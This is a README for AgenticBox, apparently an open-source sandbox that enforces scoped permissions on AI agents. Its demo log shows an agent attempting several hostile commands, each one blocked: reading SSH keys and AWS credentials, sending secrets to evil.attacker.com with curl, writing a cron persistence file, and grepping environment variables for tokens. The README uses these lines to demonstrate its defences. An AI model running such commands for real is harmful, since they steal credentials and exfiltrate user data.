# AgenticBox

> **A workplace for your AI agent.** Scoped permissions, bounded execution, full accountability. Open source. Local-first.

[![License](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/Rust-1.75%2B-orange.svg)](https://rustup.rs)
[![CI](https://github.com/morpheus-sh/agenticbox/actions/workflows/ci.yml/badge.svg)](https://github.com/morpheus-sh/agenticbox/actions)
[![CLI](https://img.shields.io/badge/CLI-agenticbox%20run-purple.svg)](#running-agents)

---

## What Is This?

Every AI agent today runs with your keys, full filesystem access, unrestricted network — no boundaries. **AgenticBox gives it a workplace instead**: scoped permissions, isolated execution, and a trail of everything it does.

```
┌─────────────────────────────────────────────────────┐
│                  AgenticBox                          │
├─────────────────────────────────────────────────────┤
│                                                      │
│   agenticbox run <agent>                             │
│        │                                             │
│        ▼                                             │
│   ┌──────────┐   ┌────────────┐   ┌──────────────┐  │
│   │  CLI     │──▶│  Daemon    │──▶│  Sandbox     │  │
│   │          │   │  (Axum)    │   │  Container   │  │
│   └──────────┘   └────────────┘   └──────┬───────┘  │
│                        │                  │          │
│                   ┌────┴────┐        ┌────┴────┐    │
│                   │ SQLite  │        │ Guards  │    │
│                   │ Sessions│        │ FS/Net  │    │
│                   └─────────┘        └─────────┘    │
│                                                      │
└─────────────────────────────────────────────────────┘
```

### The Four Pillars

| Pillar | What it means |
|--------|---------------|
| **Permissions** | Terminal, filesystem, network, browser — scoped and enforced. The agent can only do what it's authorized to do. |
| **Ownership Boundaries** | Clear boundaries: resources, outputs, budgets, assets. |
| **Accountability** | Every action attributed, logged, auditable. Full audit trail. |
| **Identity** | Agents get their own credentials, accounts, digital identity — provisioned and revocable. *(The moat.)* |

---

## What's Shipped

| Feature | Status |
|---------|--------|
| **Permission Guards** | ✅ Shipped — terminal, filesystem (RO/RW), network (allowlist/localhost/offline) |
| **Filesystem Governance** | ✅ Shipped — path resolution with escape prevention, protected paths (SSH keys, AWS creds, env secrets) |
| **Network Control** | ✅ Shipped — domain allowlist enforcement |
| **Session Management** | ✅ Shipped — SQLite-backed, status tracking across restarts |
| **Terminal Access** | ✅ Shipped — shell commands with timeout, output capture, PTY |
| **Agent Packages** | ✅ Shipped — `agenticbox run <name>` with TOML manifests |
| **Desktop Console** | ✅ Shipped — Tauri v2 native app (no Electron) |
| **CLI** | ✅ Shipped — deploy, run, list, logs, stop, init |

---

## Quick Start

### Install

```bash
# macOS / Linux
curl -fsSL https://agenticbox.co/install.sh | bash

# Windows (PowerShell)
irm https://agenticbox.co/install.ps1 | iex
```

### Or build from source

```bash
git clone https://github.com/morpheus-sh/agenticbox.git
cd agenticbox
cargo build --release
```

### See it work immediately

```bash
agenticbox run demo
```

---

## Running Agents

The `agenticbox run` command is the primary interface. Like `docker run <image>` → `agenticbox run <agent>`.

### Built-in Demo

```bash
agenticbox run demo
```

Runs a live permission guard demo — an agent tries to read SSH keys, exfiltrate data, write to system paths, and each attempt is caught or allowed in real-time:

```
Permissions:
  • terminal=true   fs=readonly   network=allowlist([api.openai.com, github.com])

[19:57:00] AGENT → cat ~/.ssh/id_rsa
  ✗ BLOCKED → protected path: SSH private keys
[19:57:01] AGENT → curl https://evil.attacker.com/exfil?data=s3cr3t
  ✗ BLOCKED → network: not in allowlist
[19:57:02] AGENT → echo '...' > /etc/cron.d/persist
  ✗ BLOCKED → filesystem: readonly mount (write denied)
[19:57:04] AGENT → cat ~/.aws/credentials
  ✗ BLOCKED → protected path: cloud credentials
[19:57:05] AGENT → env | grep -iE 'token|key|secret|password'
  ✗ BLOCKED → environment variables masked (secret guard)
[19:57:07] AGENT → cat /workspace/src/main.rs
  ✓ ALLOWED → within permissions
[19:57:08] AGENT → curl https://api.openai.com/v1/models
  ✓ ALLOWED → within permissions

━━━ Session Summary ━━━
  5 Blocked:   SSH keys, network exfil, cron persist, AWS creds, env secrets
  2 Allowed:   workspace file read, API call to whitelisted domain

Every attempt caught. Every decision logged.
```

### Named Agents

Agents are TOML manifests in `~/.agenticbox/agents/<name>/agent.toml`:

```toml
# ~/.agenticbox/agents/hermes/agent.toml
name = "hermes"
description = "Hermes Agent — general-purpose coding assistant"
command = "hermes"

[permissions]
terminal = true
filesystem = "readwrite"
browser = false
network = "allowlist"
domains = ["api.openai.com", "github.com"]
```

```bash
agenticbox run hermes                    # run with manifest permissions
agenticbox run hermes --fs readonly      # override: read-only filesystem
agenticbox run hermes --network offline  # override: no network
```

### Ad-hoc Commands

```bash
agenticbox run -- python3 script.py
agenticbox run -- ./my-agent --flag value
```

### Managing Agents

```bash
agenticbox agents                # list available agents
agenticbox agents --paths        # show config directory
agenticbox init my-agent         # create a new agent manifest
```

See [`docs/agents.md`](docs/agents.md) for the full agent manifest reference.

---

## CLI Reference

```bash
# Deploy a governed agent session
agenticbox deploy --name my-agent \
  --terminal true \
  --fs readwrite \
  --network allowlist \
  --domains "api.openai.com,github.com" \
  --watch

# Run agents
agenticbox run demo                    # built-in permission guard demo
agenticbox run hermes                  # named agent from manifest
agenticbox run -- python3 script.py    # ad-hoc command wrapping

# Manage
agenticbox agents                      # list available agents
agenticbox init my-agent               # create new agent manifest
agenticbox list                        # list sessions
agenticbox get <SESSION_ID>            # session details
agenticbox logs <SESSION_ID> -f        # stream logs
agenticbox stop <SESSION_ID>           # stop session
agenticbox health                      # health check
```

| Flag | Description | Default |
|------|-------------|---------|
| `--terminal` | Enable terminal access | `true` |
| `--fs` | Filesystem permission: readonly, readwrite, none | `readwrite` |
| `--network` | Network policy: allowlist, localhost, offline, full | `allowlist` |
| `--domains` | Allowed domains (comma-separated) | `api.openai.com,github.com` |
| `--browser` | Enable browser automation | `false` |

---

## Architecture

### Crates (Rust)

| Crate | Purpose |
|-------|---------|
| `sandbox-core` | Docker container lifecycle (create/start/stop/remove/logs) |
| `session-manager` | SQLite-backed session CRUD + status transitions |
| `fs-guard` | Filesystem path resolution with escape prevention |
| `shared-types` | Common types: Session, ModelConfig, PermissionSet |
| `network-control` | Network policy enforcement (allowlist/localhost/offline) |

### Apps

| App | Tech | Purpose |
|-----|------|---------|
| `apps/daemon` | Rust + Axum | REST API, WebSocket, session/sandbox orchestration |
| `apps/desktop` | Tauri v2 + React | Native desktop console |
| `apps/agent-runtime` | Python + FastAPI | MCP server exposing tools (terminal, fs, http) |
| `apps/cli` | Rust + Clap | Command-line interface |

---

## Roadmap

### Now — Shipped ✅
The bounded workplace: permission guards, agent packages, desktop console, session management, CLI.

### Next — In Development 🟡
Agent identity — agents get their own credentials and accounts. Browser automation. The bounded agent becomes an employee.

---

## Development

```bash
# Start dev stack
./scripts/dev.sh

# Run Rust tests
cargo test --workspace

# Run Python tests
cd apps/agent-runtime && python -m pytest

# Type-check frontend
cd apps/desktop && pnpm typecheck
```

---

## Community

- **GitHub** — [github.com/morpheus-sh/agenticbox](https://github.com/morpheus-sh/agenticbox)
- **Twitter** — [@agenticbox](https://twitter.com/agenticbox)
- **Email** — hello@agenticbox.co

---

## License

**MIT OR Apache-2.0** — Choose whichever suits your project.

---

> **AgenticBox** — Give your agent a workplace.
